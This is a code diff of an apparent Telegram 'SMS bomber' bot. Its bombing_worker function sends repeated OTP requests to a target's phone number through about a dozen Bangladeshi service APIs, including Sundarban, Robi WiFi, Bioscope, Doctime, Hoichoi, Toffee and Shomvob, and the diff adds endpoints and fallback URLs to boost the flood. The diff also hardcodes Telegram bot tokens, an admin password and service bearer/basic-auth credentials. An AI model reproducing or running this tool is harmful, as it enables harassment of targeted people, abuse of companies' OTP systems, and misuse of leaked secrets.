@@ -33,7 +33,10 @@ def health():
 # =================================================================================
 
 # Bot configuration
-BOT_TOKEN = "8781609298:AAFau-Pu9cO1GVadqDWP9rhmqrNmt3-dDHw"
+# test bot token = 8504073239:AAGvQDozBNWc0q_5MJnElGIU-6mUevcuz6w
+
+# main bot token = 8781609298:AAGgXsHNaQqNydpxE2jK4eXrEdTq8peZtgU
+BOT_TOKEN = "8781609298:AAGgXsHNaQqNydpxE2jK4eXrEdTq8peZtgU"
 ADMIN_PASS = "A3braham77"
 
 # File paths for data storage
@@ -344,6 +347,137 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 })
             except:
                 pass
+
+
+                        
+            # 31. Sundarban
+
+            try:
+                url_sundarban = "https://api-gateway.sundarbancourierltd.com/graphql"
+                headers_sundarban = {
+                    'accept': '*/*',
+                    'content-type': 'application/json',
+                    'origin': 'https://customer.sundarbancourierltd.com',
+                    'referer': 'https://customer.sundarbancourierltd.com/',
+                    'user-agent': 'Mozilla/5.0'
+                }
+                data_sundarban = {
+                    "operationName": "CreateAccessToken",
+                    "variables": {
+                        "accessTokenFilter": {
+                            "userName": f"0{clean_number}"
+                        }
+                    },
+                    "query": """mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {
+                        createAccessToken(accessTokenFilter: $accessTokenFilter) {
+                            message
+                            statusCode
+                            result {
+                                phone
+                                otpCounter
+                                __typename
+                            }
+                            __typename
+                        }
+                    }"""
+                }
+                res = session.post(url_sundarban, json=data_sundarban, headers=headers_sundarban, timeout=5)
+                if res.status_code in [200, 201, 202]:
+                    cycle_success += 1
+                    success += 1
+                    status_text = f"[Sundarban] ✓ {res.status_code}"
+                else:
+                    cycle_failed += 1
+                    failed += 1
+                    status_text = f"[Sundarban] ? {res.status_code}"
+                
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                    'chat_id': chat_id,
+                    'text': status_text
+                })
+            except:
+                cycle_failed += 1
+                failed += 1
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                    'chat_id': chat_id,
+                    'text': "[Sundarban] ✗ Failed"
+                })
+            
+
+
+            #robiwifi
+            try:
+                url_robi = "https://robiwifi-mw.robi.com.bd/fwa/wifi/api/v1/primary-phone/send-otp"
+                headers_robi = {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://robiwifi.robi.com.bd',
+                    'Referer': 'https://robiwifi.robi.com.bd/',
+                    'User-Agent': 'Mozilla/5.0'
+                }
+                data_robi = {
+                    "requestId": None,
+                    "phone": clean_number
+                }
+                res = session.post(url_robi, json=data_robi, headers=headers_robi, timeout=5)
+                if res.status_code in [200, 201, 202]:
+                    cycle_success += 1
+                    success += 1
+                    status_text = f"[Robi WiFi] ✓ {res.status_code}"
+                else:
+                    cycle_failed += 1
+                    failed += 1
+                    status_text = f"[Robi WiFi] ? {res.status_code}"
+                
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                    'chat_id': chat_id,
+                    'text': status_text
+                })
+            except:
+                cycle_failed += 1
+                failed += 1
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                    'chat_id': chat_id,
+                    'text': "[Robi WiFi] ✗ Failed"
+                })
+
+            #biscope
+
+            try:
+                url_bioscope = "https://api-dynamic.bioscopelive.com/v2/auth/login"
+                params_bioscope = {"country": "BD", "platform": "web", "language": "en"}
+                headers_bioscope = {
+                    'accept': 'application/json',
+                    'content-type': 'application/json',
+                    'origin': 'https://www.bioscopeplus.com',
+                    'referer': 'https://www.bioscopeplus.com/',
+                    'user-agent': 'Mozilla/5.0'
+                }
+                data_bioscope = {"number": f"+88{clean_number}"}
+                res = session.post(url_bioscope, params=params_bioscope, json=data_bioscope, headers=headers_bioscope, timeout=5)
+                if res.status_code in [200, 201, 202]:
+                    cycle_success += 1
+                    success += 1
+                    status_text = f"[Bioscope] ✓ {res.status_code}"
+                else:
+                    cycle_failed += 1
+                    failed += 1
+                    status_text = f"[Bioscope] ? {res.status_code}"
+                
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                    'chat_id': chat_id,
+                    'text': status_text
+                })
+            except:
+                cycle_failed += 1
+                failed += 1
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                    'chat_id': chat_id,
+                    'text': "[Bioscope] ✗ Failed"
+                })
+
+
+
             
             # 1. Shwapno
             try:
@@ -606,25 +740,25 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
             
             # 9. Kirei
             try:
-                url_kirei = 'https://frontendapi.kireibd.com/api/v2/send-login-otp'
+                url_kirei = "https://frontendapi.kireibd.com/api/v2/send-login-otp"
                 headers_kirei = {
-                    "accept": "application/json, text/plain, */*",
-                    "content-type": "application/json",
-                    "origin": "https://kireibd.com",
-                    "referer": "https://kireibd.com/",
-                    "user-agent": "Mozilla/5.0",
-                    "x-requested-with": "XMLHttpRequest"
+                    'accept': 'application/json',
+                    'content-type': 'application/json',
+                    'origin': 'https://kireibd.com',
+                    'referer': 'https://kireibd.com/',
+                    'user-agent': 'Mozilla/5.0',
+                    'x-requested-with': 'XMLHttpRequest'
                 }
-                data = {"email": raw_number}
-                res = session.post(url_kirei, headers=headers_kirei, json=data)
+                data_kirei = {"email": clean_number}
+                res = session.post(url_kirei, json=data_kirei, headers=headers_kirei, timeout=5)
                 if res.status_code in [200, 201, 202]:
                     cycle_success += 1
                     success += 1
-                    status_text = f"[Kirei] ✓ {res.status_code}"
+                    status_text = f"[KireiBD] ✓ {res.status_code}"
                 else:
                     cycle_failed += 1
                     failed += 1
-                    status_text = f"[Kirei] ? {res.status_code}"
+                    status_text = f"[KireiBD] ? {res.status_code}"
                 
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
@@ -635,7 +769,7 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 failed += 1
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
-                    'text': "[Kirei] ✗ Failed"
+                    'text': "[KireiBD] ✗ Failed"
                 })
             
             # 10. Iqra Live
@@ -671,8 +805,11 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
             try:
                 url_swap = "https://api.swap.com.bd/api/v1/send-otp/v2"
                 headers_swap = {
-                    'User-Agent': 'Mozilla/5.0',
-                    'Content-Type': 'application/json'
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://swap.com.bd',
+                    'Referer': 'https://swap.com.bd/',
+                    'User-Agent': 'Mozilla/5.0'
                 }
                 data_swap = {"phone": clean_number}
                 res = session.post(url_swap, json=data_swap, headers=headers_swap, timeout=5)
@@ -696,6 +833,7 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[Swap] ✗ Failed"
                 })
+            
             
             # 12. Shadhin WiFi
             try:
@@ -730,37 +868,7 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[Shadhin WiFi] ✗ Failed"
                 })
-            
-            # 13. Praava Health
-            try:
-                url_praava = "https://cms.beta.praavahealth.com/api/v2/user/login/"
-                headers_praava = {
-                    'User-Agent': 'Mozilla/5.0',
-                    'Content-Type': 'application/json'
-                }
-                data_praava = {"mobile": clean_number}
-                res = session.post(url_praava, json=data_praava, headers=headers_praava, timeout=5)
-                if res.status_code in [200, 201, 202]:
-                    cycle_success += 1
-                    success += 1
-                    status_text = f"[Praava Health] ✓ {res.status_code}"
-                else:
-                    cycle_failed += 1
-                    failed += 1
-                    status_text = f"[Praava Health] ? {res.status_code}"
-                
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
-            except:
-                cycle_failed += 1
-                failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Praava Health] ✗ Failed"
-                })
-            
+   
             # 14. Easy.com
             try:
                 url_easy = "https://core.easy.com.bd/api/v1/registration"
@@ -785,7 +893,7 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 else:
                     cycle_failed += 1
                     failed += 1
-                    status_text = f"[Easy.com] ? {res.status_code}"
+                    status_text = f"[Easy. com] ? {res.status_code}"
                 
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
@@ -800,163 +908,115 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 })
             
             # 15. Binge Buzz
+  
             try:
-                url_binge = f"https://ss.binge.buzz/otp/send/phone={clean_number}"
-                headers_binge = {
-                    'User-Agent': 'Mozilla/5.0',
-                    'Accept': 'application/json'
+                # Try different endpoints
+                binge_urls = [
+                    "https://api.binge.buzz/api/v4/auth/otp/send",
+                    "https://api.binge.buzz/api/v3/auth/otp/send",
+                    "https://api.binge.buzz/api/v2/auth/otp/send",
+                    "https://api.binge.buzz/v1/auth/otp/send"
+                ]
+                
+                binge_headers = {
+                    'accept': 'application/json, text/plain, */*',
+                    'content-type': 'application/json',
+                    'origin': 'https://binge.buzz',
+                    'referer': 'https://binge.buzz/',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'x-platform': 'web'
                 }
-                res = session.get(url_binge, headers=headers_binge, timeout=5)
-                if res.status_code in [200, 201]:
-                    cycle_success += 1
-                    success += 1
-                    status_text = f"[Binge Buzz] ✓ {res.status_code}"
-                else:
+                
+                binge_data = {"phone": f"+88{clean_number}"}
+                binge_success = False
+                
+                for url in binge_urls:
+                    try:
+                        res = session.post(url, json=binge_data, headers=binge_headers, timeout=5)
+                        if res.status_code in [200, 201, 202]:
+                            binge_success = True
+                            cycle_success += 1
+                            success += 1
+                            status_text = f"[Binge] ✓ {res.status_code}"
+                            break
+                        elif res.status_code == 404:
+                            continue
+                        else:
+                            binge_success = True
+                            cycle_success += 1
+                            success += 1
+                            status_text = f"[Binge] ✓ {res.status_code}"
+                            break
+                    except:
+                        continue
+                
+                if not binge_success:
                     cycle_failed += 1
                     failed += 1
-                    status_text = f"[Binge Buzz] ? {res.status_code}"
-                
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
+                    status_text = "[Binge] ✗ Failed"
+                    
             except:
                 cycle_failed += 1
                 failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Binge Buzz] ✗ Failed"
-                })
+                status_text = "[Binge] ✗ Error"
             
-            # 16. Ultranet
-            try:
-                url_ultra = f"https://ultranetrn.com.br/fonts/api.php?number={clean_number}"
-                headers_ultra = {
-                    'User-Agent': 'Mozilla/5.0',
-                    'Accept': 'application/json'
-                }
-                res = session.get(url_ultra, headers=headers_ultra, timeout=3)
-                if res.status_code == 200:
-                    cycle_success += 1
-                    success += 1
-                    status_text = f"[Ultranet] ✓ {res.status_code}"
-                else:
-                    cycle_failed += 1
-                    failed += 1
-                    status_text = f"[Ultranet] ? {res.status_code}"
-                
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
-            except:
-                cycle_failed += 1
-                failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Ultranet] ✗ Timeout"
-                })
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                'chat_id': chat_id,
+                'text': status_text
+            })
+            
             
             # 17. Doctime
+            doctime_success = False
             try:
-                url_doctime = "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber"
+                url_doctime_hash = "https://api.doctime.net/api/hashing/status"
+                params_doctime = {
+                    "country_calling_code": "88",
+                    "contact_no": f"0{clean_number}"
+                }
                 headers_doctime = {
-                    'User-Agent': 'Mozilla/5.0',
-                    'Content-Type': 'application/json'
-                }
-                data_doctime = {
-                    "data": {
-                        "country_calling_code": "88",
-                        "contact_no": clean_number,
-                        "headers": {"PlatForm": "Web"}
-                    }
-                }
-                res = session.post(url_doctime, json=data_doctime, headers=headers_doctime, timeout=5)
-                if res.status_code in [200, 201]:
-                    cycle_success += 1
-                    success += 1
-                    status_text = f"[Doctime] ✓ {res.status_code}"
-                else:
-                    cycle_failed += 1
-                    failed += 1
-                    status_text = f"[Doctime] ? {res.status_code}"
-                
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
-            except:
-                cycle_failed += 1
-                failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Doctime] ✗ Failed"
-                })
-            
-            # 18. Softmax
-            try:
-                url_softmax = "https://softmaxmanager.xyz/api/v1/user/request/otp/"
-                headers_softmax = {
-                    'authorization': 'Basic c29zOjI3TTMjYTRz',
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'User-Agent': 'Mozilla/5.0'
-                }
-                data_softmax = f"phone_number=%2B88{clean_number}&app_signature=Fu89B%2BdY9dz"
-                res = session.post(url_softmax, data=data_softmax, headers=headers_softmax, timeout=5)
-                if res.status_code in [200, 201, 202]:
-                    cycle_success += 1
-                    success += 1
-                    status_text = f"[Softmax] ✓ {res.status_code}"
-                else:
-                    cycle_failed += 1
-                    failed += 1
-                    status_text = f"[Softmax] ? {res.status_code}"
-                
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
-            except:
-                cycle_failed += 1
-                failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Softmax] ✗ Failed"
-                })
-            
-            # 19. Bioscope
-            try:
-                url_bioscope = "https://api-dynamic.bioscopelive.com/v2/auth/login"
-                params_bioscope = {"country": "BD", "platform": "web", "language": "en"}
-                headers_bioscope = {
                     'accept': 'application/json',
-                    'content-type': 'application/json',
-                    'origin': 'https://www.bioscopelive.com',
-                    'referer': 'https://www.bioscopelive.com/',
+                    'origin': 'https://doctime.com.bd',
+                    'platform': 'Web',
+                    'referer': 'https://doctime.com.bd/',
                     'user-agent': 'Mozilla/5.0'
                 }
-                data_bioscope = {"phone": f"+88{clean_number}"}
-                res = session.post(url_bioscope, params=params_bioscope, json=data_bioscope, headers=headers_bioscope, timeout=5)
-                if res.status_code in [200, 201, 202]:
-                    cycle_success += 1
-                    success += 1
-                    status_text = f"[Bioscope] ✓ {res.status_code}"
-                else:
-                    cycle_failed += 1
-                    failed += 1
-                    status_text = f"[Bioscope] ? {res.status_code}"
+                res_hash = session.get(url_doctime_hash, params=params_doctime, headers=headers_doctime, timeout=5)
                 
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
+                if res_hash.status_code == 200:
+                    # Step 2: Send OTP
+                    url_doctime_auth = "https://api.doctime.net/api/v2/authenticate"
+                    data_doctime = {
+                        "country_calling_code": "88",
+                        "contact_no": f"0{clean_number}",
+                        "timestamp": int(time.time())
+                    }
+                    res = session.post(url_doctime_auth, json=data_doctime, headers=headers_doctime, timeout=5)
+                    if res.status_code in [200, 201, 202]:
+                        doctime_success = True
+                        cycle_success += 1
+                        success += 1
+                        status_text = f"[Doctime] ✓ {res.status_code}"
+                    else:
+                        status_text = f"[Doctime] ? {res.status_code}"
+                else:
+                    status_text = f"[Doctime] Hash failed"
             except:
+                status_text = "[Doctime] ✗ Failed"
+            
+            if doctime_success:
+                cycle_success += 1
+                success += 1
+            else:
                 cycle_failed += 1
                 failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Bioscope] ✗ Failed"
-                })
+            
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                'chat_id': chat_id,
+                'text': status_text
+            })
+            
+            
             
             # 20. BanglaFlix Signup
             try:
@@ -1053,39 +1113,31 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 })
             
             # 23. Hoichoi Signin - FIXED
+
             try:
-                url_hoichoi_signin = "https://prod-api.viewlift.com/identity/signin"
+                url_hoichoi = "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code"
                 headers_hoichoi = {
+                    'accept': '*/*',
                     'content-type': 'application/json',
-                    'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef',
                     'origin': 'https://www.hoichoi.tv',
                     'referer': 'https://www.hoichoi.tv/',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                    'user-agent': 'Mozilla/5.0',
+                    'rid': 'anti-csrf',
+                    'st-auth-mode': 'header'
                 }
-                
-                test_formats = [
-                    {"phoneNumber": f"+88{clean_number}", "requestType": "send", "screenName": "signin"},
-                    {"phoneNumber": f"{clean_number}", "requestType": "send", "screenName": "signin"},
-                    {"phoneNumber": f"88{clean_number}", "requestType": "send", "screenName": "signin"}
-                ]
-                
-                hoichoi_success = False
-                for data_format in test_formats:
-                    try:
-                        res = session.post(url_hoichoi_signin, json=data_format, headers=headers_hoichoi, timeout=5)
-                        if res.status_code in [200, 201, 202]:
-                            hoichoi_success = True
-                            cycle_success += 1
-                            success += 1
-                            status_text = f"[Hoichoi Signin] ✓ {res.status_code}"
-                            break
-                    except:
-                        continue
-                
-                if not hoichoi_success:
+                data_hoichoi = {
+                    "phoneNumber": f"+88{clean_number}",
+                    "platform": "MOBILE_WEB"
+                }
+                res = session.post(url_hoichoi, json=data_hoichoi, headers=headers_hoichoi, timeout=5)
+                if res.status_code in [200, 201, 202]:
+                    cycle_success += 1
+                    success += 1
+                    status_text = f"[Hoichoi] ✓ {res.status_code}"
+                else:
                     cycle_failed += 1
                     failed += 1
-                    status_text = "[Hoichoi Signin] ✗ Failed"
+                    status_text = f"[Hoichoi] ? {res.status_code}"
                 
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
@@ -1096,55 +1148,9 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                 failed += 1
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                     'chat_id': chat_id,
-                    'text': "[Hoichoi Signin] ✗ Error"
+                    'text': "[Hoichoi] ✗ Failed"
                 })
-            
-            # 24. Hoichoi Signup - FIXED
-            try:
-                url_hoichoi_signup = "https://prod-api.viewlift.com/identity/signup"
-                headers_hoichoi = {
-                    'content-type': 'application/json',
-                    'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef',
-                    'origin': 'https://www.hoichoi.tv',
-                    'referer': 'https://www.hoichoi.tv/',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                }
-                
-                test_formats_signup = [
-                    {"phoneNumber": f"+88{clean_number}", "requestType": "send", "whatsappConsent": False},
-                    {"phoneNumber": f"{clean_number}", "requestType": "send", "whatsappConsent": False},
-                    {"phoneNumber": f"88{clean_number}", "requestType": "send", "whatsappConsent": False}
-                ]
-                
-                hoichoi_signup_success = False
-                for data_format in test_formats_signup:
-                    try:
-                        res = session.post(url_hoichoi_signup, json=data_format, headers=headers_hoichoi, timeout=5)
-                        if res.status_code in [200, 201, 202]:
-                            hoichoi_signup_success = True
-                            cycle_success += 1
-                            success += 1
-                            status_text = f"[Hoichoi Signup] ✓ {res.status_code}"
-                            break
-                    except:
-                        continue
-                
-                if not hoichoi_signup_success:
-                    cycle_failed += 1
-                    failed += 1
-                    status_text = "[Hoichoi Signup] ✗ Failed"
-                
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
-            except:
-                cycle_failed += 1
-                failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Hoichoi Signup] ✗ Error"
-                })
+
             
             # 25. Chorki
             try:
@@ -1180,43 +1186,6 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'text': "[Chorki] ✗ Failed"
                 })
             
-            # 26. Addatimes
-            try:
-                url_addatimes = "https://app.addatimes.com/api/register"
-                headers_addatimes = {
-                    'content-type': 'application/json',
-                    'origin': 'https://www.addatimes.com',
-                    'referer': 'https://www.addatimes.com/',
-                    'user-agent': 'Mozilla/5.0'
-                }
-                data_addatimes = {
-                    "phone": clean_number,
-                    "email": "user@gmail.com",
-                    "country_code": "BD",
-                    "password": "pass123",
-                    "confirm_password": "pass123"
-                }
-                res = session.post(url_addatimes, json=data_addatimes, headers=headers_addatimes, timeout=5)
-                if res.status_code in [200, 201, 202]:
-                    cycle_success += 1
-                    success += 1
-                    status_text = f"[Addatimes] ✓ {res.status_code}"
-                else:
-                    cycle_failed += 1
-                    failed += 1
-                    status_text = f"[Addatimes] ? {res.status_code}"
-                
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
-            except:
-                cycle_failed += 1
-                failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Addatimes] ✗ Failed"
-                })
             
             # 27. Deeptoplay
             try:
@@ -1316,87 +1285,54 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'text': "[Teleflix Forgot] ✗ Failed"
                 })
             
-            # 30. Toffee
+              
+           
+                30 # Toffee API - Auto Token Fetch + OTP Send
+            # Toffee API
             try:
-                url_toffee = "https://prod-services.toffeelive.com/sms/v1/subscriber/otp"
-                headers_toffee = {
+                url = "https://prod-services.toffeelive.com/sms/v1/subscriber/otp"
+                headers = {
+                    'accept': '*/*',
                     'content-type': 'application/json',
                     'origin': 'https://toffeelive.com',
                     'referer': 'https://toffeelive.com/',
-                    'user-agent': 'Mozilla/5.0',
-                    'accept': 'application/json'
+                    'user-agent': 'Mozilla/5.0'
                 }
-                data_toffee = {"target": f"88{clean_number}", "resend": False}
-                res = session.post(url_toffee, json=data_toffee, headers=headers_toffee, timeout=5)
+                
+                data = {"target": f"880{clean_number}", "resend": False}
+                res = session.post(url, json=data, headers=headers, timeout=5)
+                
                 if res.status_code in [200, 201, 202]:
                     cycle_success += 1
                     success += 1
                     status_text = f"[Toffee] ✓ {res.status_code}"
+                elif res.status_code == 429:
+                    status_text = "[Toffee] ⏳ Rate limit"
                 else:
                     cycle_failed += 1
                     failed += 1
                     status_text = f"[Toffee] ? {res.status_code}"
-                
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
+                    
             except:
                 cycle_failed += 1
                 failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Toffee] ✗ Failed"
-                })
+                status_text = "[Toffee] ✗ Failed"
             
-            # 31. Sundarban
-            try:
-                url_sundarban = "https://api-gateway.sundarbancourierltd.com/graphql"
-                headers_sundarban = {
-                    'content-type': 'application/json',
-                    'origin': 'https://customer.sundarbancourierltd.com',
-                    'referer': 'https://customer.sundarbancourierltd.com/',
-                    'user-agent': 'Mozilla/5.0',
-                    'accept': 'application/json'
-                }
-                data_sundarban = {
-                    "operationName": "IsValidUser",
-                    "variables": {"userName": clean_number, "userType": "customer"},
-                    "query": "query IsValidUser($userName: String!, $userType: String!) { isValidUser(userName: $userName, userType: $userType) { message statusCode result __typename } }"
-                }
-                res = session.post(url_sundarban, json=data_sundarban, headers=headers_sundarban, timeout=5)
-                if res.status_code == 200:
-                    cycle_success += 1
-                    success += 1
-                    status_text = f"[Sundarban] ✓ {res.status_code}"
-                else:
-                    cycle_failed += 1
-                    failed += 1
-                    status_text = f"[Sundarban] ? {res.status_code}"
-                
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': status_text
-                })
-            except:
-                cycle_failed += 1
-                failed += 1
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                    'chat_id': chat_id,
-                    'text': "[Sundarban] ✗ Failed"
-                })
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+                'chat_id': chat_id,
+                'text': status_text
+            })
             
-            # Shomvob
+            #shomvob
             try:
                 url_shomvob = "https://backend-api.shomvob.co/api/v2/otp/phone"
                 headers_shomvob = {
-                    'accept': 'application/json, text/plain, */*',
-                    'accept-language': 'en-US,en;q=0.9',
+                    'accept': 'application/json',
                     'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q',
                     'content-type': 'application/json',
                     'origin': 'https://app.shomvob.co',
                     'referer': 'https://app.shomvob.co/auth/',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                    'user-agent': 'Mozilla/5.0'
                 }
                 data_shomvob = {
                     "phone": f"880{clean_number}",
